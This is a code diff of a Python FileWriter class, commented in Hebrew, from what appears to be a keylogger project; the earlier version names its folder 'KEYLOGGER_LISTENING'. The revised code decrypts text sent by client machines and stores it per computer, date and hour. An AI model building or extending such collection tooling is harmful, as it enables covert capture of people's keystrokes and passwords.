@@ -1,30 +1,33 @@
+import os
 from encryptor import Encryptor
 
 class FileWriter:
-    def __init__(self, base_dir_name="KEYLOGGER_LISTENING", key="my-secret-key"):
-        desktop = Path.home() / "Desktop"
-        self.base_dir = desktop / base_dir_name
-        os.makedirs(self.base_dir, exist_ok=True)
-        self.decryptor = Encryptor(key)
+    def __init__(self, computer_name, base_path="logs", key="my-secret-key"):
+        """
+        אתחול המחלקה FileWriter
+        :param computer_name: שם המחשב ממנו מגיעים הלוגים
+        :param base_path: ספריית בסיס לשמירת הלוגים
+        :param key: מפתח ההצפנה/פענוח
+        """
+        self.computer_name = computer_name
+        self.base_path = base_path
+        self.encryptor = Encryptor(key)
 
-    def write(self, log_entry):
-        try:
-            timestamp = datetime.now()
-            filename = f"{timestamp.strftime('%Y-%m-%d_%H')}.txt"
-            file_path = os.path.join(self.base_dir, filename)
+    def write(self, text, date, hour):
+        """
+        כותב טקסט לפייל לוג מתאים
+        :param text: הטקסט המוצפן מהקליינט
+        :param date: תאריך (YYYY-MM-DD)
+        :param hour: שעה (HH)
+        """
+        # נתיב מלא: logs/<computer_name>/<date>/<hour>.txt
+        dir_path = os.path.join(self.base_path, self.computer_name, date)
+        os.makedirs(dir_path, exist_ok=True)
+        file_path = os.path.join(dir_path, f"{hour}.txt")
 
-            if log_entry.startswith("("):
-                message = f"{log_entry}\n"
-            else:
-                decrypted = self.decryptor.decrypt(log_entry)
-                parts = decrypted.split(" | ")
-                if len(parts) > 1:
-                    message = f"{parts[0]} | {parts[1]}\n"
-                else:
-                    message = f"{decrypted}\n"
+        # פענוח הטקסט לפני כתיבה
+        decrypted = self.encryptor.decrypt(text)
 
-            with open(file_path, "a", encoding="utf-8") as f:
-                f.write(message)
-
-        except Exception as e:
-            print(f"⚠️ שגיאה בכתיבה: {e}")
+        # כתיבה לקובץ
+        with open(file_path, "a", encoding="utf-8") as f:
+            f.write(decrypted + "\n")
